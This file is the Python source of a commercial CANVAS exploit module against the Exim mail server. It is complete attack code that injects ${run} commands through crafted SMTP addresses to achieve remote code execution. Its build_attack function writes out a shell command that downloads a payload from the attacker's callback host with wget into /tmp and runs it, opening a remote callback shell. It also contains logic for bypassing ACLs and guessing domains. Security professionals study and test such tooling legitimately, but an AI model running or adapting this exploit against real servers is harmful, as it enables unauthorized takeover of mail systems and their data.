#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import os
import re
import socket
import logging
import smtplib

import canvasengine
import timeoutsocket

from exploitutils import *
from tcpexploit import *
from libs import yaml
from libs.canvasos import *

# Monkey patch smtplib.quoteaddr as it mishandles the \-escape sequences
# we put in the recipient address.  We need to have Exim interpret these
# in order to be able to use the ':' operator.
smtplib.quoteaddr = lambda x: x

module_path = os.path.dirname(os.path.realpath(__file__))

with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self._target        = ''
        self._port          = 25
        self._tls           = False
        self._username      = ''
        self._password      = ''
        self._domain        = None
        self._method        = 'auto'
        self._arch          = 'X64'

        self._mua           = smtplib.SMTP()
        self._banner        = None
        self._authenticated = False
        self._webserver     = None
        self._got_connection= False

        if hasattr(self, 'header'): getattr(self, 'header')()

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self._target   = self.target.interface
        self._port     = int(self.argsDict.get('port', self._port))
        self._tls      = bool(self.argsDict.get('tls', self._tls))
        self._username = self.argsDict.get('username', self._username)
        self._password = self.argsDict.get('password', self._password)
        self._domain   = self.argsDict.get('domain', self._domain)
        if not len(self._domain): self._domain = None
        self._arch     = self.argsDict.get('arch0_value', self._arch).upper()

        method = self.argsDict.get('radiobutton1_value', 'auto').lower()
        if 'auto' in method:
            self._method = 'auto'
        elif 'auth' in method:
            self._method = 'auth'
        elif 'relay' in method:
            self._method = 'relay'
        elif 'freeze' in method:
            self._method = 'freeze'
        else:
            logging.error('Unknown exploitation method provided {}'.format(method))

    def build_mosdef_callback(self):
        t_os = canvasos("Linux")
        t_os.arch = self._arch
        try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                         target_os=t_os, universal=True)
            if ret:
                return self.mosdeftrojan
        except Exception, err:
            logging.error("Error while building MOSDEF callback: %s" % str(err))

        return None

    def setup_webserver(self, callback):
        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"]            = 80
        app.argsDict["singleexploit"]   = "upload"
        app.argsDict["sourcedata"]      = callback
        app.argsDict["auto_port"]       = True

        ret = app.listen()
        self._webserver = app

        return ret

    def webserver_accept(self):
        while not self._got_connection:
            self._webserver.accept()

        logging.debug("Exiting webserver")

    # smtplib does not gracefully handle esmtp_features and ehlo_resp
    # reset using quit() in case it raises.  We fix things here.
    def close(self):
        self._authenticated      = False
        self._banner             = None
        self._mua.helo_resp      = None
        self._mua.ehlo_resp      = None
        self._mua.esmtp_features = {}
        self._mua.does_esmtp     = False
        self._mua.close()

    def connect(self, silent=False):
        if not silent:
            logging.info("Initiating contact with {}:{}\n".format(self._target, self._port))

        # Connect and grab the banner of the remote.
        self._banner = self._mua.connect(self._target, self._port)
        self._banner = self._banner[1].decode()

        if not silent:
            logging.info("{}\n\n".format(self._banner))
        self._mua.ehlo_or_helo_if_needed()

        # If the remote supports TLS, we may as well use it.  This is a best effort
        # attempt.  We do not mandate the use, and do not care about SSLstrip.
        if not silent:
            logging.info("Negotiating terms")
        if 'starttls' in self._mua.esmtp_features and self._tls:
            self._mua.starttls()
            # EHLO again, so we can get the ESMTP feature set under TLS.  This is
            # necessary as some methods such as AUTH PLAIN are typically not
            # advertised when not using a TLS connection.
            self._mua.ehlo_or_helo_if_needed()

        if self._mua.ehlo_resp is not None:
            msg = self._mua.ehlo_resp.decode()
            if not silent:
                for line in msg.split("\n"):
                    logging.info("   {}".format(line))
        elif self._mua.helo_resp is not None:
            msg = self._mua.helo_resp.decode()
            if not silent:
                for line in msg.split("\n"):
                    logging.info("   {}\n".format(line))

    def authenticate(self, username, password, silent=False):
        # If the method requested needs authentication, but the remote does not
        # support it, we bail.
        if 'auth' not in self._mua.esmtp_features:
            raise RuntimeError("SMTP server does not support authentication.")

        username = self._username
        password = self._password

        if not silent:
            logging.info("Authenticating")
            logging.info("{}".format(username))
        try:
            self._mua.login(username, password)
        except smtplib.SMTPAuthenticationError as e:
            self._log_smtp_exception(e)
            self._authenticated = False
        else:
            if not silent:
                logging.info("-> SUCCESS")
            self._authenticated = True

    def can_auth(self):
        return self._username is not None and \
               self._password is not None and \
               'auth' in self._mua.esmtp_features

    def reconnect(self):
        self.close()
        self.connect(silent=True)

        if self.can_auth():
            self.authenticate(self._username, self._password, silent=True)

    def cmd_escape(self, cmd):
        rep = ['"', '/', '<', '>', '@', ' ']
        for r in rep:
            cmd = cmd.replace(r, '\\x{:02x}'.format(ord(r)))

        return cmd

    def _expand_args(self, *args):
        arg_string = ""
        for arg in reversed(args):
            if arg is not None: arg_string = "{{{}}}{}".format(self.cmd_escape(arg), arg_string)
            elif arg_string != "": arg_string = "{}" + arg_string

        return arg_string

    def cmd_raw(self, cmd):
        return "}}{}".format(cmd)

    def cmd_run(self, cmd, string1=None, string2=None):
        arg_string = self._expand_args(cmd, string1, string2)
        return "${{run{}}}".format(arg_string)

    def build_attack(self):
        command = "/bin/sh -c \"DEBIAN_FRONTEND=noninteractive PATH=/bin:/sbin:/usr/bin apt-get -yq install wget; wget {}:{} -O - > /tmp/c; chmod 755 /tmp/c; /tmp/c\"".format(self.callback.ip, self._webserver.port)
        cmd = self.cmd_run(command)

        return self.cmd_raw(cmd)

    def exploit_auth(self):
        cmd = self.build_attack()
        msg = "Received: \r\n" * 31 + "\r\n"

        # The default configuration contains the following acl_check_rcpt:
        #
        # accept  authenticated = *
        #         control       = submission
        #         control       = dkim_disable_verify
        # ...
        # require verify = recipient
        #
        # Recipient verification would cause our injection address to be rejected,
        # but being authenticated skips this, as the message is accepted.  So we
        # can just send out our nefarious mail at this point.
        self._mua.sendmail(
            'postmaster@{}'.format(self._domain),
            '"{}"@{}'.format(cmd, self._domain),
            msg
        )

    def exploit_relay(self):
        cmd = self.build_attack()
        msg = "Received: \r\n" * 31 + "\r\n"

        # The default configuration contains the following acl_check_rcpt:
        #
        #  accept  hosts         = +relay_from_hosts
        #          control       = submission
        #          control       = dkim_disable_verify
        # ...
        # require verify = recipient
        #
        # Recipient verification would cause our injection address to be rejected,
        # but being on the relay hosts list skips this, as the message is accepted.
        # So if we are on this list (although it is unlikely that we are), we can
        # just send out our nefarious mail at this point.
        self._mua.sendmail(
            'postmaster@{}'.format(self._domain),
            '"{}"@{}'.format(cmd, self._domain),
            msg
        )

    def exploit_freeze(self):
        if self._domain is None:
            self._domain = "localhost"

        cmd = self.build_attack()
        msg = "Received: \r\n" * 31 + "\r\n"

        # When using the freeze method, we send a mail to 'postmaster' to one
        # of the domains the server handles.  This bypasses a lot of the ACL
        # logic, and still causes a rejection due to the large number of Received
        # headers.  The rejection causes a bounce mail to be sent back to the
        # original sender, which is our injected command.
        # As the headers are not copied, we need another error condition to
        # trigger a call to expand_string().  The only way to do this is by
        # waiting for the message in the queue to be frozen and then removed
        # from the queue.  The default timeout for this is 1 week.
        self._mua.sendmail(
            '"{}"@{}'.format(cmd, self._domain),
            'postmaster@{}'.format(self._domain),
            msg
        )

    def _log_smtp_exception(self, e):
        if isinstance(e, smtplib.SMTPResponseException):
            msg = e.smtp_error.decode().rstrip()
            msg = msg.replace("\n", "\n      ")
            msg = msg.rstrip()
            logging.error("{} {}".format(e.smtp_code, msg))
        elif isinstance(e, smtplib.SMTPRecipientsRefused):
            for k, v in e.recipients.items():
                msg = v[1].decode()
                msg = msg.replace("\n", "\n      ")
                msg = msg.rstrip()
                logging.error("{}".format(msg))
        elif isinstance(e, smtplib.SMTPServerDisconnected):
            logging.error("Disconnected. Attempting to reconnect")

    def exploit_auto(self):
        # If we have a username and password authenticate first.
        if self.can_auth():
            self.authenticate(self._username, self._password)

        self._domain = self.find_from_postmaster_domain()

        # If we have found a valid MAIL FROM postmaster domain we attempt
        # to use it here for either 'auth' or 'relay'.
        if self._domain is not None:
            logging.info("Attempting condemnation by means of")
            if self._authenticated:
                logging.info("auth")
                try:
                    self.exploit_auth()
                    return
                except smtplib.SMTPResponseException as e:
                    self._log_smtp_exception(e)
                    pass
                except smtplib.SMTPRecipientsRefused as e:
                    self._log_smtp_exception(e)
                    pass

            logging.info("relay")
            try:
                self.exploit_relay()
                return
            except smtplib.SMTPResponseException as e:
                self._log_smtp_exception(e)
                pass
            except smtplib.SMTPRecipientsRefused as e:
                self._log_smtp_exception(e)
                pass

        # If this didn't work so far, we scan for a valid RCPT TO postmaster
        # domain and attempt the 'freeze' method.
        self._domain = self.find_to_postmaster_domain()
        if self._domain is not None:
            logging.info("Attempting condemnation by means of freeze")

            try:
                self.exploit_freeze()
                return
            except smtplib.SMTPResponseException as e:
                self._log_smtp_exception(e)
                pass
            except smtplib.SMTPRecipientsRefused as e:
                self._log_smtp_exception(e)
                pass

    def _try_from_postmaster(self, domain):
        mail_from = 'postmaster@{}'.format(domain)
        rcpt_to   = '"<sgdljrjwsgdlm>"@{}'.format(domain)
        return self._try_mail(mail_from, rcpt_to)

    def _try_to_postmaster(self, domain):
        mail_from = '"<sgdljrjwsgdlm>"@{}'.format(domain)
        rcpt_to   = 'postmaster@{}'.format(domain)
        return self._try_mail(mail_from, rcpt_to)

    def _try_mail(self, mail_from, rcpt_to):
        logging.info("{} -> {}\n".format(mail_from, rcpt_to))
        try:
            self._mua.sendmail(mail_from, rcpt_to, '')
        except smtplib.SMTPSenderRefused as e:
            self._log_smtp_exception(e)
            return False
        except smtplib.SMTPRecipientsRefused as e:
            self._log_smtp_exception(e)
            return False
        except smtplib.SMTPServerDisconnected as e:
            self._log_smtp_exception(e)
            self.reconnect()
            return self._try_mail(mail_from, rcpt_to)
        else:
            logging.warning("-> SUCCESS")
            return True

    def domain_list(self):
        target_ip = self._mua.sock.getpeername()[0]
        local_names   = set()
        special_names = set()
        hostnames     = set()

        # Add an optional command line specified domain.
        if self._domain is not None:
            special_names.add(self._domain)

        # Add the hostname advertised by the remote.
        special_names.add(self._banner.split()[0])

        # Add the currently in use local hostnames.
        local_names.add('localhost')
        local_names.add('localhost4')
        local_names.add('localhost6')
        local_names.add('localhost.localdomain')
        local_names.add('localhost4.localdomain4')
        local_names.add('localhost6.localdomain6')
        local_names -= special_names

        # Construct the set of resolved hostnames.
        try:
            name, aliases, _ = socket.gethostbyaddr(target_ip)
            hostnames.add(name)
            hostnames.update(aliases)
        except socket.herror as e:
            pass
        hostnames -= special_names
        hostnames -= local_names

        # Try the special domains first of all.
        for special_name in special_names:
            yield special_name

        # Try the local names, minus anything we already saw.
        for local_name in local_names:
            yield local_name

        # All hostnames we resolved.
        for name in hostnames:
            yield name

        # Try if domain literals are supported.  They likely won't be, but it's
        # worth a shot.  Try both localhost and the socket peer IP address.
        for ip in set(['127.0.0.1', '::1', target_ip]):
            yield '[{}]'.format(ip)

    def find_from_postmaster_domain(self):
        logging.info("Trying MAIL FROM postmaster domains")

        for domain in self.domain_list():
            if self._try_from_postmaster(domain):
                return domain

    def find_to_postmaster_domain(self):
        logging.info("Trying RCPT TO postmaster domains")

        for domain in self.domain_list():
            if self._try_to_postmaster(domain):
                return domain

    def run(self):
        self.getargs()
        callback = self.build_mosdef_callback()

        try:
            self.setup_webserver(callback)
        except Exception as e:
            logging.error("Unable to set up a webserver")

        t = threading.Thread(target=self.webserver_accept)
        t.start()

        method = self._method
        self.connect()

        # Special case the 'auto' method, as it handles all exceptions
        # internally.
        if method == 'auto':
            self.exploit_auto()
        else:
            # Non-auto methods do not scan for domains, so we default to localhost
            if self._domain is None:
                self._domain = 'localhost'

            # Try the method, and catch the 'normal' exceptions for logging.
            try:
                if method == 'auth':
                    self.authenticate(self._username, self._password)
                    if not self._authenticated: return
                    logging.info("Sending a message from beyond...")
                    self.exploit_auth()
                elif method == 'relay':
                    logging.info("Sending a message from beyond...")
                    self.exploit_relay()
                elif method == 'freeze':
                    logging.info("Sending a message from beyond...")
                    self.exploit_freeze()
            except smtplib.SMTPResponseException as e:
                self._log_smtp_exception(e)
            except smtplib.SMTPRecipientsRefused as e:
                self._log_smtp_exception(e)

        for i in range(0, 10):
            time.sleep(1)
            if self.ISucceeded():
                logging.warning("Exploit succeeded")
                self._got_connection = True
                break

        if not self._got_connection:
            logging.critical("Exploit failed")


if __name__=='__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (NAME, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
